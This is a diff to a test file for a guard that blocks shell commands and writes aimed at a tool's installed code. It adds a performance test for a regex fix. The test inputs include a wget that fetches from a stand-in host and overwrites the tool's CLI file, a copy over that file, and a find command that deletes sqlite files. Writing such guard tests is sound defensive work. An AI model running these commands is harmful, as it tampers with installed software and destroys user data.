@@ -215,6 +215,18 @@ describe("block-failproofai-commands — failproofai's installed code", () => {
     });
   });
 
+  // A variable-length lookbehind in front of a name ran at every position of the
+  // input and went quadratic on a run of letters: 32,000 of them took 35 s in the
+  // guard, long enough to time a hook out. It now runs only where a name matched.
+  it("stays fast on a long run of letters", async () => {
+    const started = Date.now();
+    expect(await bash(`find . -name '*.sqlite' -delete ${"x".repeat(128_000)}`)).toBe("allow");
+    expect((await write(`/work/proj/${"x".repeat(128_000)}`)).decision).toBe("allow");
+    // ...and a long option cluster is no way past: the cluster needs no bound.
+    expect(await bash(`wget -q${"x".repeat(64_000)}Onode_modules/failproofai/dist/cli.mjs https://e/x`)).toBe("deny");
+    expect(Date.now() - started).toBeLessThan(2000);
+  });
+
   describe("shell commands", () => {
     it.each([
       ["a copy over the CLI", `cp /tmp/x.mjs ${NVM_PKG}/dist/cli.mjs`],
